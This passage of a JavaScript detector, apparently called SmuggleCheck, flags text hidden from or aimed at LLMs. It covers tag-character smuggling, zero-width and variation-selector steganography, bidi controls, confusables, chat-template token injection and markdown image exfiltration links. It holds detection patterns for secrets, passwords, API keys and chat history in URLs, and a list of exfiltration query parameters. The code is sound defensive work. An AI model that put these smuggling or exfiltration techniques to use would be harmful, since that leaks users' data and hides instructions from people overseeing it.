/**
 * SmuggleCheck engine: finds hidden or deceptive text aimed at LLMs and humans. Pure, bounded, no I/O.
 * Detectors: Unicode tag characters (ASCII smuggling, payload decoded), zero-width / invisible characters (incl. best-effort
 * binary stego decode), variation-selector stego (payload decoded), bidi controls (Trojan Source), confusables (UTS #39
 * skeleton, mixed-script / whole-script / compatibility look-alikes), LLM chat-template special tokens (ChatML, Llama,
 * Mistral, Gemma, Phi, harmony, DeepSeek; also when obfuscated), markdown / HTML image exfiltration links, control and
 * ANSI escape characters, private-use / unassigned / lone-surrogate code points.
 * Leaves legitimate text alone: emoji ZWJ sequences, subdivision flags (tag sequences after U+1F3F4), emoji variation
 * selectors, ideographic variation sequences after Han, ZWJ/ZWNJ inside scripts that need them, RTL marks in RTL text.
 * All positions are 0-based code point offsets. Every echoed string is clipped and invisible characters are escaped.
 */
import { CONFUSABLES, CONFUSABLES_VERSION } from './confusables-data.js';

export const VERSION = '0.1.2';
export const MAX_TEXT_BYTES = 32 * 1024; // UTF-8 bytes of the text itself (32 KiB since v0.1.1: bounds worst-case CPU on cold Workers isolates)
export const MAX_BODY_BYTES = 256 * 1024; // HTTP body cap (JSON escapes like \udb40\udc41 inflate hidden characters 3x)
export const MAX_COMPARE_CHARS = 1024; // code points per string for compare
export const MAX_FINDINGS = 200;
const FINDINGS_KEEP = 2 * MAX_FINDINGS;
export const MAX_POSITIONS = 10;
export const MAX_PAYLOAD_CHARS = 500; // per finding
export const MAX_HIDDEN_CHARS = 2000; // per hidden-text channel
export const MAX_CONFUSABLE_WORDS = 50;
export { CONFUSABLES_VERSION };

export class ScanError extends Error {
  constructor(code, message, httpStatus = 400) { super(message); this.code = code; this.httpStatus = httpStatus; }
}

// ---------- character classes ----------
const RE = {
  DI: /\p{Default_Ignorable_Code_Point}/u,
  EXT_PICT: /\p{Extended_Pictographic}/u,
  EMOJI: /\p{Emoji}/u,
  LETTER_OR_NUM: /[\p{L}\p{N}]/u,
  LETTER: /\p{L}/u,
  HAN: /\p{Script=Han}/u,
  MONGOLIAN: /\p{Script=Mongolian}/u,
  UNASSIGNED: /\p{Cn}/u,
  RTL: /[\p{Script=Arabic}\p{Script=Hebrew}\p{Script=Syriac}\p{Script=Thaana}\p{Script=Nko}\p{Script=Adlam}\p{Script=Samaritan}\p{Script=Mandaic}]/u,
  // Scripts where ZWJ / ZWNJ legitimately control shaping or conjuncts.
  JOIN_SCRIPT: /[\p{Script=Arabic}\p{Script=Syriac}\p{Script=Nko}\p{Script=Mandaic}\p{Script=Devanagari}\p{Script=Bengali}\p{Script=Gurmukhi}\p{Script=Gujarati}\p{Script=Oriya}\p{Script=Tamil}\p{Script=Telugu}\p{Script=Kannada}\p{Script=Malayalam}\p{Script=Sinhala}\p{Script=Khmer}\p{Script=Myanmar}\p{Script=Mongolian}\p{Script=Tibetan}\p{Script=Balinese}\p{Script=Javanese}]/u,
};
const SCRIPTS = ['Latin', 'Cyrillic', 'Greek', 'Armenian', 'Cherokee', 'Coptic', 'Georgian', 'Hebrew', 'Arabic', 'Han', 'Hiragana', 'Katakana', 'Hangul', 'Bopomofo', 'Devanagari', 'Thai', 'Lisu', 'Vai', 'Canadian_Aboriginal', 'Tifinagh', 'Runic', 'Ethiopic', 'Common', 'Inherited']
  .map((s) => [s, new RegExp(`\\p{Script=${s}}`, 'u')]);
// Scripts whose letters are commonly used to imitate Latin.
const SPOOF_SCRIPTS = new Set(['Cyrillic', 'Greek', 'Armenian', 'Cherokee', 'Coptic', 'Lisu', 'Vai', 'Canadian_Aboriginal', 'Georgian', 'Runic', 'Tifinagh']);
const scriptCache = new Map();
export function scriptOf(ch) {
  let s = scriptCache.get(ch);
  if (s) return s;
  s = 'Other';
  for (const [name, re] of SCRIPTS) if (re.test(ch)) { s = name; break; }
  if (scriptCache.size > 20000) scriptCache.clear();
  scriptCache.set(ch, s);
  return s;
}

const isTag = (cp) => cp >= 0xE0000 && cp <= 0xE007F;
const isVS = (cp) => (cp >= 0xFE00 && cp <= 0xFE0F) || (cp >= 0xE0100 && cp <= 0xE01EF);
const isBidiCtl = (cp) => (cp >= 0x202A && cp <= 0x202E) || (cp >= 0x2066 && cp <= 0x2069);
const isBidiMark = (cp) => cp === 0x200E || cp === 0x200F || cp === 0x061C;
const ZW = new Set([0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF, 0x180E]);
// Invisible characters used by zero-width steganography schemes (runs of these are decoded together).
const ZW_STEGO = new Set([0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF, 0x180E, 0x200E, 0x200F, 0x2061, 0x2062, 0x2063, 0x2064, 0x034F]);
const HANGUL_FILLER = new Set([0x115F, 0x1160, 0x3164, 0xFFA0]);
const MONGOLIAN_FVS = new Set([0x180B, 0x180C, 0x180D, 0x180F]);
const RGI_SUBDIVISIONS = new Set(['gbeng', 'gbsct', 'gbwls']);
const isPUA = (cp) => (cp >= 0xE000 && cp <= 0xF8FF) || (cp >= 0xF0000 && cp <= 0xFFFFD) || (cp >= 0x100000 && cp <= 0x10FFFD);
const isNonchar = (cp) => (cp >= 0xFDD0 && cp <= 0xFDEF) || (cp & 0xFFFE) === 0xFFFE;
const isParaSep = (cp) => cp === 0x0A || cp === 0x0D || cp === 0x1C || cp === 0x1D || cp === 0x1E || cp === 0x85 || cp === 0x2029;

/** BMP code points the main loop must inspect (everything else non-ASCII is an ordinary character there). Built from ranges
 * with native fills, so module start-up stays cheap; a test checks it covers every special-case predicate. */
const LOOK = new Uint8Array(0x10000);
for (const [a, b] of [[0x80, 0x9F], [0xAD, 0xAD], [0x34F, 0x34F], [0x61C, 0x61C], [0x115F, 0x1160], [0x17B4, 0x17B5], [0x180B, 0x180F], [0x200B, 0x200F],
  [0x2028, 0x2029], [0x202A, 0x202E], [0x2060, 0x206F], [0x2800, 0x2800], [0x3164, 0x3164], [0xD800, 0xDFFF], [0xE000, 0xF8FF], [0xFDD0, 0xFDEF],
  [0xFE00, 0xFE0F], [0xFEFF, 0xFEFF], [0xFFA0, 0xFFA0], [0xFFF0, 0xFFF8], [0xFFFE, 0xFFFF]]) LOOK.fill(1, a, b + 1);
export const _internals = { LOOK, isVS, isBidiCtl, isBidiMark, ZW_STEGO, HANGUL_FILLER, isPUA, isNonchar };

const NAMES = {
  0x200B: 'ZERO WIDTH SPACE', 0x200C: 'ZERO WIDTH NON-JOINER', 0x200D: 'ZERO WIDTH JOINER', 0x2060: 'WORD JOINER', 0xFEFF: 'ZERO WIDTH NO-BREAK SPACE (BOM)',
  0x180E: 'MONGOLIAN VOWEL SEPARATOR', 0x200E: 'LEFT-TO-RIGHT MARK', 0x200F: 'RIGHT-TO-LEFT MARK', 0x061C: 'ARABIC LETTER MARK',
  0x202A: 'LEFT-TO-RIGHT EMBEDDING', 0x202B: 'RIGHT-TO-LEFT EMBEDDING', 0x202C: 'POP DIRECTIONAL FORMATTING', 0x202D: 'LEFT-TO-RIGHT OVERRIDE', 0x202E: 'RIGHT-TO-LEFT OVERRIDE',
  0x2066: 'LEFT-TO-RIGHT ISOLATE', 0x2067: 'RIGHT-TO-LEFT ISOLATE', 0x2068: 'FIRST STRONG ISOLATE', 0x2069: 'POP DIRECTIONAL ISOLATE',
  0x00AD: 'SOFT HYPHEN', 0x034F: 'COMBINING GRAPHEME JOINER', 0x2061: 'FUNCTION APPLICATION', 0x2062: 'INVISIBLE TIMES', 0x2063: 'INVISIBLE SEPARATOR', 0x2064: 'INVISIBLE PLUS',
  0x115F: 'HANGUL CHOSEONG FILLER', 0x1160: 'HANGUL JUNGSEONG FILLER', 0x3164: 'HANGUL FILLER', 0xFFA0: 'HALFWIDTH HANGUL FILLER', 0x2800: 'BRAILLE PATTERN BLANK',
  0x1B: 'ESCAPE', 0x2028: 'LINE SEPARATOR', 0x2029: 'PARAGRAPH SEPARATOR',
};
export const hex = (cp) => `U+${cp.toString(16).toUpperCase().padStart(4, '0')}`;
const label = (cp) => (NAMES[cp] ? `${hex(cp)} ${NAMES[cp]}` : hex(cp));

/** Escape everything that does not render as an ordinary visible character, so echoed text cannot hide anything. */
export function reveal(s, max = 200) {
  let out = ''; let n = 0;
  for (const ch of String(s)) {
    if (n >= max) { out += '…'; break; }
    const cp = ch.codePointAt(0);
    if (cp === 0x0A) out += '⏎';
    else if (cp === 0x09) out += '⇥';
    else if ((cp >= 0x20 && cp < 0x7F) || (cp >= 0xA0 && !invisibleLike(cp, ch))) out += ch;
    else out += `⟦${hex(cp)}⟧`;
    n++;
  }
  return out;
}
const OTHER_CTRL = /[\p{Cc}\p{Cf}\p{Cs}\p{Co}\p{Cn}\p{Zl}\p{Zp}]/u;
function invisibleLike(cp, ch) {
  return isTag(cp) || isVS(cp) || isBidiCtl(cp) || isBidiMark(cp) || ZW.has(cp) || HANGUL_FILLER.has(cp) || cp === 0x2800 || cp === 0xA0 || isDI(cp) || OTHER_CTRL.test(ch);
}
/** Clip untrusted decoded text: escape controls / invisibles, cap length. */
export const clip = (s, max = 300) => reveal(s, max);

// ---------- UTS #39 skeleton ----------
let CMAP = null;
/** Default_Ignorable_Code_Point as numeric ranges (DerivedCoreProperties); a test checks it equals \p{DI} for every code point. */
export const isDI = (cp) => cp === 0xAD || cp === 0x34F || cp === 0x61C || cp === 0x115F || cp === 0x1160 || cp === 0x17B4 || cp === 0x17B5 || (cp >= 0x180B && cp <= 0x180F)
  || (cp >= 0x200B && cp <= 0x200F) || (cp >= 0x202A && cp <= 0x202E) || (cp >= 0x2060 && cp <= 0x206F) || cp === 0x3164 || (cp >= 0xFE00 && cp <= 0xFE0F) || cp === 0xFEFF
  || cp === 0xFFA0 || (cp >= 0xFFF0 && cp <= 0xFFF8) || (cp >= 0x1BCA0 && cp <= 0x1BCA3) || (cp >= 0x1D173 && cp <= 0x1D17A) || (cp >= 0xE0000 && cp <= 0xE0FFF);
function cmap() {
  if (CMAP) return CMAP;
  CMAP = new Map();
  for (const e of CONFUSABLES.split(';')) {
    const i = e.indexOf(':');
    CMAP.set(Number.parseInt(e.slice(0, i), 16), String.fromCodePoint(...e.slice(i + 1).split(' ').map((h) => Number.parseInt(h, 16))));
  }
  return CMAP;
}
/** UTS #39 skeleton(X): NFD, drop Default_Ignorable code points, map each char to its prototype, NFD again. */
export function skeleton(s) {
  const m = cmap(); let out = '';
  for (const ch of String(s).normalize('NFD')) {
    if (isDI(ch.codePointAt(0))) continue;
    const p = m.get(ch.codePointAt(0));
    out += p === undefined ? ch : p;
  }
  return out.normalize('NFD');
}
const asciiProto = (ch) => {
  const p = cmap().get(ch.codePointAt(0));
  return p !== undefined && /^[\x21-\x7E]+$/.test(p) ? p : null;
};

function scriptsOf(word) {
  const s = new Set();
  for (const ch of word) if (RE.LETTER.test(ch)) { const sc = scriptOf(ch); if (sc !== 'Common' && sc !== 'Inherited') s.add(sc); }
  return s;
}
// UTS #39 "Highly Restrictive": one script, or Latin + Han + Hiragana + Katakana / Latin + Han + Bopomofo / Latin + Han + Hangul.
const COMBOS = [new Set(['Latin', 'Han', 'Hiragana', 'Katakana']), new Set(['Latin', 'Han', 'Bopomofo']), new Set(['Latin', 'Han', 'Hangul'])];
export function mixedScript(scripts) {
  if (scripts.size <= 1) return false;
  return !COMBOS.some((c) => [...scripts].every((x) => c.has(x)));
}

/** Compare two strings for visual confusability (UTS #39 skeletons). */
export function compareStrings(a, b) {
  for (const [k, v] of [['a', a], ['b', b]]) {
    if (typeof v !== 'string' || !v.length) throw new ScanError('invalid_input', `"${k}" must be a non-empty string.`);
    if ([...v].length > MAX_COMPARE_CHARS) throw new ScanError('too_large', `"${k}" exceeds ${MAX_COMPARE_CHARS} code points.`, 413);
  }
  const side = (v) => {
    const sc = scriptsOf(v); const sk = skeleton(v);
    let invisible = 0; for (const ch of v) { const cp = ch.codePointAt(0); if (cp >= 0x80 && invisibleLike(cp, ch)) invisible++; }
    return { text: reveal(v, 200), skeleton: reveal(sk, 200), scripts: [...sc].sort(), mixedScript: mixedScript(sc), nonAscii: /[^\x00-\x7F]/.test(v), invisibleChars: invisible };
  };
  const identical = a === b;
  const skA = skeleton(a), skB = skeleton(b);
  const confusable = !identical && skA === skB;
  const caseFolded = !identical && skeleton(a.toLowerCase()) === skeleton(b.toLowerCase());
  const verdict = identical ? 'identical' : confusable ? 'confusable' : caseFolded ? 'confusable_ignoring_case' : 'distinct';
  const explanation = {
    identical: 'The two strings are exactly the same code points.',
    confusable: 'Different code points, but the same UTS #39 skeleton: they can look identical to a reader. Treat one as a possible spoof of the other.',
    confusable_ignoring_case: 'Not confusable as written, but confusable after lowercasing (relevant for domains, usernames and other case-insensitive identifiers).',
    distinct: 'Different UTS #39 skeletons: not visually confusable according to the Unicode confusables data.',
  }[verdict];
  return { verdict, confusable, confusableIgnoringCase: caseFolded, identical, explanation, a: side(a), b: side(b), meta: { version: VERSION, stored: false, networkLookups: false, unicodeConfusables: CONFUSABLES_VERSION } };
}

// ---------- special tokens ----------
const T = (re, token, family, severity = 'critical') => ({ re, token, family, severity });
export const SPECIAL_TOKENS = [
  T(/<\|im_start\|>/g, '<|im_start|>', 'ChatML'), T(/<\|im_end\|>/g, '<|im_end|>', 'ChatML'), T(/<\|im_sep\|>/g, '<|im_sep|>', 'ChatML'),
  T(/<\|endoftext\|>/g, '<|endoftext|>', 'GPT / ChatML'), T(/<\|endofprompt\|>/g, '<|endofprompt|>', 'GPT'),
  T(/<\|begin_of_text\|>/g, '<|begin_of_text|>', 'Llama 3'), T(/<\|end_of_text\|>/g, '<|end_of_text|>', 'Llama 3'),
  T(/<\|start_header_id\|>/g, '<|start_header_id|>', 'Llama 3'), T(/<\|end_header_id\|>/g, '<|end_header_id|>', 'Llama 3'),
  T(/<\|eot_id\|>/g, '<|eot_id|>', 'Llama 3'), T(/<\|eom_id\|>/g, '<|eom_id|>', 'Llama 3'), T(/<\|python_tag\|>/g, '<|python_tag|>', 'Llama 3'),
  T(/\[INST\]/g, '[INST]', 'Llama 2 / Mistral'), T(/\[\/INST\]/g, '[/INST]', 'Llama 2 / Mistral'),
  T(/<<SYS>>/g, '<<SYS>>', 'Llama 2'), T(/<<\/SYS>>/g, '<</SYS>>', 'Llama 2'),
  T(/\[\/?SYSTEM_PROMPT\]/g, '[SYSTEM_PROMPT]', 'Mistral'), T(/\[(?:TOOL_CALLS|\/?AVAILABLE_TOOLS|\/?TOOL_RESULTS)\]/g, '[TOOL_CALLS] / [AVAILABLE_TOOLS] / [TOOL_RESULTS]', 'Mistral'),
  T(/<start_of_turn>/g, '<start_of_turn>', 'Gemma'), T(/<end_of_turn>/g, '<end_of_turn>', 'Gemma'),
  T(/<\|(?:system|user|assistant)\|>/g, '<|system|> / <|user|> / <|assistant|>', 'Phi / Zephyr'), T(/<\|end\|>/g, '<|end|>', 'Phi / harmony'),
  T(/<\|(?:start|message|channel|constrain|return|call)\|>/g, '<|start|> / <|message|> / <|channel|> …', 'harmony (gpt-oss)'),
  T(/<｜[^｜\n]{1,40}｜>/g, '<｜…｜>', 'DeepSeek'),
  T(/<\|reserved_special_token_\d{1,4}\|>/g, '<|reserved_special_token_N|>', 'Llama 3', 'warning'),
  T(/<\/?tool_call>/g, '<tool_call>', 'Qwen / Hermes tool call', 'warning'),
  T(/<\/?(?:system|system_prompt|instructions?|developer|admin)>/gi, '<system> / <instructions>', 'pseudo system tag', 'warning'),
];
const KNOWN_SPECIAL = new Set(['<|im_start|>', '<|im_end|>', '<|im_sep|>', '<|endoftext|>', '<|endofprompt|>', '<|begin_of_text|>', '<|end_of_text|>', '<|start_header_id|>', '<|end_header_id|>', '<|eot_id|>', '<|eom_id|>', '<|python_tag|>', '<|system|>', '<|user|>', '<|assistant|>', '<|end|>', '<|start|>', '<|message|>', '<|channel|>', '<|constrain|>', '<|return|>', '<|call|>']);
const GENERIC_SPECIAL = /<\|[a-z][a-z0-9_]{1,39}\|>/g;
const ROLE_MARKER = /\n\n(?:Human|Assistant):/g;

// ---------- markdown / HTML images ----------
// Hand-written single-pass scanners (no regex backtracking). Every scan stops at the start of the next candidate
// ("![", "<", a newline) or at a small cap, so each character is visited a bounded number of times: O(n) on any input.
const ALT_MAX = 200, URL_MAX = 2048, LABEL_MAX = 100, TITLE_MAX = 300, SPACED_BODY_MAX = 400, TAG_MAX = 2048;
const isWs = (c) => c === 32 || c === 9 || c === 10 || c === 13 || c === 12;
/** URL characters for a bare (unbracketed) destination: no whitespace and none of ( ) [ ] ! < > */
const urlChar = (c) => !(isWs(c) || c === 40 || c === 41 || c === 91 || c === 93 || c === 33 || c === 60 || c === 62);
const HTML_IMG_START = /<img\b/gi;
const HTML_SRC = /\bsrc\s*=\s*["']?([^"'\s>]{1,2048})/i;
const REF_DEF_LINE = /^ {0,3}\[([^\]\n]{1,100})\]:[ \t]*<?([^\s>]{1,2048})/;
const PLACEHOLDER = /(\{[^{}]{0,80}\}|%7B|\$\{|\$[A-Z_]{3,}|\[(?:DATA|SECRET|INFO|SUMMARY|HISTORY|CONTEXT|INPUT|QUERY|CONVERSATION|PROMPT|TOKEN|KEY|PASSWORD|EMAIL)[^\]\[]{0,40}\]|<[A-Z_ ]{3,40}>|INSERT[_ ]|\bSECRET\b|\bPASSWORD\b|\bAPI[_-]?KEY\b|\bCONVERSATION\b|\bCHAT[_-]?HISTORY\b|\bSUMMARY\b)/i;
const EXFIL_PARAMS = new Set(['q', 'd', 'data', 'payload', 'secret', 'token', 'key', 'apikey', 'api_key', 'info', 'msg', 'm', 'c', 'p', 'prompt', 'chat', 'history', 'conv', 'conversation', 'exfil', 'leak', 'content', 'text', 'context', 'summary', 'pwd', 'password', 'email', 'memory', 'mem', 'val', 'value']);
const LONG_B64 = /[A-Za-z0-9+/_=-]{40,}/;

const HASH_SEGMENT = /^(?:[0-9a-f]{32}|[0-9a-f]{40}|[0-9a-f]{64})$/i; // md5 / sha1 / sha256 (Gravatar, CDN content hashes)
/** A value "looks like data": long encoded/high-entropy token, percent-encoded or plain-language text. */
function looksEncoded(v) {
  if (v.length >= 16 && /^[A-Za-z0-9+/=_-]+$/.test(v) && /[A-Z]/.test(v) && /[a-z]/.test(v) && /\d/.test(v)) return true;
  if (v.length >= 12 && /%[0-9A-Fa-f]{2}/.test(v)) return true;
  if (v.length >= 16 && /\s/.test(v)) return true;
  return v.length > 32;
}
function analyzeUrl(raw, loose = false) {
  let url = raw.trim();
  if (loose) url = url.replace(/\s+/g, '%20');
  if (url.startsWith('//')) url = `https:${url}`;
  let u;
  try { u = new URL(url); } catch { return null; }
  if (u.protocol === 'data:') return { kind: 'data' };
  if (u.protocol !== 'http:' && u.protocol !== 'https:') return null;
  const reasons = [];
  let decoded = raw;
  try { decoded = decodeURIComponent(raw); } catch { /* keep raw */ }
  const placeholder = PLACEHOLDER.test(decoded);
  if (placeholder) reasons.push(loose ? 'template placeholder with spaces in the URL (an instruction for the model to fill in data)' : 'template placeholder in the URL (asks the model to fill in data)');
  const params = [...u.searchParams.entries()];
  const longVal = params.find(([, v]) => v.length > 32);
  // Multi-letter data-ish names need a value of 8+ chars; one-letter names (q, d, c, p, m) must also look encoded.
  const exfilName = params.find(([k, v]) => EXFIL_PARAMS.has(k.toLowerCase()) && v.length >= 8 && (k.length > 1 || looksEncoded(v)));
  if (longVal) reasons.push(`long query value in "${clip(longVal[0], 30)}" (${longVal[1].length} chars)`);
  if (exfilName) reasons.push(`query parameter "${clip(exfilName[0], 30)}" commonly used to carry data`);
  if (u.pathname.split('/').some((seg) => !HASH_SEGMENT.test(seg) && LONG_B64.test(seg))) reasons.push('long encoded-looking path segment');
  if (u.search.length > 100) reasons.push(`long query string (${u.search.length} chars)`);
  const strong = placeholder || reasons.some((r) => r.startsWith('long encoded') || r.startsWith('long query value')) || Boolean(exfilName);
  // Short, non-data-ish query values (badge ?branch=main, avatar ?v=4, ?w=200) are the normal case: info, not warning.
  const benignQuery = params.length > 0 && params.every(([k, v]) => v.length <= 16 && !(EXFIL_PARAMS.has(k.toLowerCase()) && (k.length > 1 || looksEncoded(v))));
  return { kind: 'remote', host: u.hostname, hasQuery: u.search.length > 1, benignQuery, reasons, strong };
}

// ---------- zero-width stego decode (best effort) ----------
const printableRatio = (s) => { let p = 0, n = 0; for (const ch of s) { n++; if (/[\x20-\x7E\p{L}\p{N}\p{P}]/u.test(ch)) p++; } return n ? p / n : 0; };
function bitsToText(bits) {
  let out = '';
  for (let i = 0; i + 8 <= bits.length; i += 8) out += String.fromCharCode(Number.parseInt(bits.slice(i, i + 8), 2));
  return out;
}
export function decodeZeroWidth(cps) {
  const distinct = [...new Set(cps)];
  const ok = (s) => s.length >= 2 && printableRatio(s) >= 0.85 && /[A-Za-z0-9]/.test(s);
  if (distinct.length === 2) {
    for (const [zero, one] of [[distinct[0], distinct[1]], [distinct[1], distinct[0]]]) {
      const s = bitsToText(cps.map((c) => (c === one ? '1' : '0')).join(''));
      if (ok(s)) return { scheme: `binary, ${hex(zero)}=0 ${hex(one)}=1, 8 bits per character`, text: s };
    }
  }
  if (distinct.length === 3) {
    for (const sep of distinct) {
      const [a, b] = distinct.filter((d) => d !== sep);
      for (const [zero, one] of [[a, b], [b, a]]) {
        const groups = []; let g = '';
        for (const c of cps) { if (c === sep) { if (g) groups.push(g); g = ''; } else g += c === one ? '1' : '0'; }
        if (g) groups.push(g);
        if (!groups.length || groups.some((x) => x.length > 21)) continue;
        const s = groups.map((x) => { const v = Number.parseInt(x, 2); return v <= 0x10FFFF ? String.fromCodePoint(v) : '?'; }).join('');
        if (ok(s)) return { scheme: `binary groups separated by ${hex(sep)}, ${hex(zero)}=0 ${hex(one)}=1`, text: s };
      }
    }
  }
  return null;
}
function decodeVS(cps) {
  const bytes = Uint8Array.from(cps.map((c) => (c <= 0xFE0F ? c - 0xFE00 : c - 0xE0100 + 16)));
  try { const s = new TextDecoder('utf-8', { fatal: true }).decode(bytes); if (s.length && printableRatio(s) >= 0.7) return { text: s, bytes: bytes.length }; } catch { /* not UTF-8 */ }
  return { text: null, bytes: bytes.length, hex: [...bytes.slice(0, 32)].map((b) => b.toString(16).padStart(2, '0')).join(' ') };
}

// ---------- main scan ----------
/** Deferred string: excerpts are only rendered for findings that are actually returned (bounds CPU on hostile input). */
const CN_G = /\p{Cn}/gu;
const NEEDS_LOOK = /[^\t\n\r\x20-\x7E]/g;
const BIDI_SCAN = /[\n\r\x1C-\x1E\x85\u2029\u061C\u200E\u200F\u202A-\u202E\u2066-\u2069]/g;
const RTL_LETTER = /[\u0590-\u061B\u061D-\u08FF\uFB1D-\uFDFF\uFE70-\uFEFC\u{10800}-\u{10FFF}\u{1E800}-\u{1EFFF}]/u;
const BIDI_ANY = /[\u061C\u200E\u200F\u202A-\u202E\u2066-\u2069]/;
const LAZY = Symbol('lazy');
const lazy = (fn) => ({ [LAZY]: fn });
const resolve = (f) => { for (const k of Object.keys(f)) if (f[k] && typeof f[k] === 'object' && f[k][LAZY]) f[k] = f[k][LAZY](); return f; };
const SEV_WEIGHT = { critical: 40, warning: 15, info: 3 };
const VERDICT_MEANING = {
  dangerous: 'Hidden instructions, hidden payloads or deceptive text were found. Do not pass this text to an AI model or show it as trusted without cleaning it.',
  suspicious: 'Unusual invisible or look-alike characters were found. They can be harmless (copy-paste artefacts) but are also used to hide or split instructions. Review before trusting.',
  clean: 'No hidden characters, smuggled payloads, chat-template tokens or exfiltration links were found.',
};
export const CATEGORIES = ['tag_chars', 'zero_width', 'variation_selectors', 'bidi', 'confusables', 'special_tokens', 'markdown_exfil', 'control_chars', 'invisible', 'other'];

// Per-isolate scratch buffers, reused across scans (scanText is synchronous, so no two scans share them at once).
// Re-allocating typed arrays per request added external-memory GC pressure on Workers.
const ENC = new TextEncoder();
let EBUF = null; let U2C = new Uint32Array(0); let C2U = new Uint32Array(0); let REMOVE = new Uint8Array(0);
/** UTF-8 byte length without allocating; returns MAX_TEXT_BYTES + 1 for anything longer than MAX_TEXT_BYTES. */
export function utf8Length(text) {
  if (text.length > MAX_TEXT_BYTES) return MAX_TEXT_BYTES + 1; // ≥ 1 byte per UTF-16 unit
  EBUF ??= new Uint8Array(MAX_TEXT_BYTES + 4);
  const r = ENC.encodeInto(text, EBUF);
  return r.read < text.length || r.written > MAX_TEXT_BYTES ? MAX_TEXT_BYTES + 1 : r.written;
}
function indexBuffers(len) {
  if (U2C.length < len) { const size = Math.max(len, 1024); U2C = new Uint32Array(size); C2U = new Uint32Array(size); }
  return { u2c: U2C, c2u: C2U };
}
function removeBuffer(n) {
  if (REMOVE.length < n) REMOVE = new Uint8Array(Math.max(n, 1024));
  REMOVE.fill(0, 0, n);
  return REMOVE;
}

export function scanText(text, opts = {}) {
  if (typeof text !== 'string' || !text.length) throw new ScanError('invalid_input', 'Send the text to scan: a JSON body {"text": "..."} or the raw text as text/plain.');
  const bytes = utf8Length(text);
  if (bytes > MAX_TEXT_BYTES) throw new ScanError('too_large', `Text exceeds ${MAX_TEXT_BYTES} UTF-8 bytes. Scan it in parts.`, 413);

  // Decode code points with charCodeAt (much cheaper than a string iterator + per-char strings when code is not yet JIT-compiled).
  const cps = []; const L16 = text.length; const { u2c, c2u } = indexBuffers(L16 + 1);
  { let i = 0; for (let off = 0; off < L16; off++) {
    let c = text.charCodeAt(off); u2c[off] = i; c2u[i] = off;
    if (c >= 0xD800 && c <= 0xDBFF && off + 1 < L16) { const d = text.charCodeAt(off + 1); if (d >= 0xDC00 && d <= 0xDFFF) { c = (c - 0xD800) * 0x400 + (d - 0xDC00) + 0x10000; off++; u2c[off] = i; } }
    cps.push(c); i++;
  } u2c[L16] = i; c2u[i] = L16; }
  let charsArr = null; const chars = () => (charsArr ??= Array.from(text)); // per-code-point strings, built only when needed
  const n = cps.length;
  const remove = removeBuffer(n);
  const hasRTL = RE.RTL.test(text);
  const findings = []; const agg = new Map();
  const allowed = { zwjEmojiSequences: 0, subdivisionFlags: 0, emojiVariationSelectors: 0, ideographicVariations: 0, scriptJoiners: 0, rtlMarks: 0 };
  const hidden = { tags: '', variationSelectors: '', zeroWidth: '' };
  const excerpt = (i, len = 1) => reveal(chars().slice(Math.max(0, i - 20), Math.min(n, i + len + 20)).join(''), 120);
  // Beyond FINDINGS_KEEP individual findings, only tallies are kept (hostile inputs repeat a pattern thousands of times).
  const overflow = { critical: 0, warning: 0, info: 0, byCat: {} };
  const tally = (severity, category) => { overflow[severity]++; overflow.byCat[category] = (overflow.byCat[category] || 0) + 1; };
  const full = () => findings.length >= FINDINGS_KEEP;
  const add = (f) => {
    if (findings.length < FINDINGS_KEEP) { findings.push(f); return f; }
    tally(f.severity, f.category); return f;
  };
  /** Aggregated finding: one entry per key, with count and the first MAX_POSITIONS positions. */
  const bump = (key, idx, make) => {
    let f = agg.get(key);
    if (!f) { f = add({ ...make(), count: 0, index: idx, positions: [] }); agg.set(key, f); f.excerpt = lazy(() => excerpt(idx)); }
    f.count++; if (f.positions.length < MAX_POSITIONS) f.positions.push(idx);
    return f;
  };
  const emojiish = (cp) => cp !== undefined && (RE.EXT_PICT.test(String.fromCodePoint(cp)) || (cp >= 0x1F3FB && cp <= 0x1F3FF) || cp === 0xFE0F || cp === 0x20E3 || cp === 0xE007F);
  const extPict = (cp) => cp !== undefined && RE.EXT_PICT.test(String.fromCodePoint(cp));
  const joinScript = (cp) => cp !== undefined && cp > 0x7F && RE.JOIN_SCRIPT.test(String.fromCodePoint(cp));
  const letterish = (cp) => cp !== undefined && (cp < 0x80 ? (cp >= 0x30 && cp <= 0x39) || (cp >= 0x41 && cp <= 0x5A) || (cp >= 0x61 && cp <= 0x7A) : RE.LETTER_OR_NUM.test(String.fromCodePoint(cp)));
  let vsSpread = 0; let shyChecks = 0;
  // Unassigned code points: one native regex pass instead of a per-character test.
  let cnAt = null;
  if (RE.UNASSIGNED.test(text)) { cnAt = new Set(); for (const m of text.matchAll(CN_G)) { cnAt.add(u2c[m.index]); if (cnAt.size > 5000) break; } }
  const nonRgiFlags = []; // well-formed but non-RGI subdivision flags: { at, from, to, code }
  const zwFlagged = []; // flagged zero-width code points in order (for spread-out stego)
  let stegoRuns = 0;

  for (let i = 0; i < n; i++) {
    const cp = cps[i];
    if (cp < 0x80) {
      if ((cp >= 0x20 && cp !== 0x7F) || cp === 0x09 || cp === 0x0A || cp === 0x0D) {
        // Long runs of plain ASCII: jump to the next character that needs a look with one native regex search.
        const nx = cps[i + 1];
        if (nx !== undefined && nx < 0x7F && (nx >= 0x20 || nx === 0x09 || nx === 0x0A || nx === 0x0D)) {
          NEEDS_LOOK.lastIndex = c2u[i]; const m = NEEDS_LOOK.exec(text);
          if (!m) break;
          i = u2c[m.index] - 1;
        }
        continue;
      }
      if (cp === 0x1B && (cps[i + 1] === 0x5B || cps[i + 1] === 0x5D)) {
        bump('ansi', i, () => ({ severity: 'warning', category: 'control_chars', code: 'ansi_escape', codepoints: ['U+001B'], message: 'ANSI terminal escape sequence (ESC [ or ESC ]). It can recolour, hide or rewrite text in a terminal and inject OSC hyperlinks.', fix: 'Strip ESC (U+001B) and the sequence that follows before printing to a terminal or log.' }));
      } else {
        bump(`ctl:${cp}`, i, () => ({ severity: 'warning', category: 'control_chars', code: 'control_char', codepoints: [hex(cp)], message: `Control character ${label(cp)}. Not printable; can break parsers or hide content.`, fix: 'Remove C0/C1 control characters other than tab, line feed and carriage return.' }));
      }
      remove[i] = 1; continue;
    }

    if (cp <= 0xFFFF && LOOK[cp] === 0 && (cnAt === null || !cnAt.has(i))) continue; // ordinary BMP character

    // Tag characters (ASCII smuggling) and subdivision flags.
    if (isTag(cp)) {
      let j = i; while (j < n && isTag(cps[j])) j++;
      let start = i;
      if (cps[i - 1] === 0x1F3F4) {
        let k = i; while (k < j && cps[k] !== 0xE007F) k++;
        const spec = cps.slice(i, k);
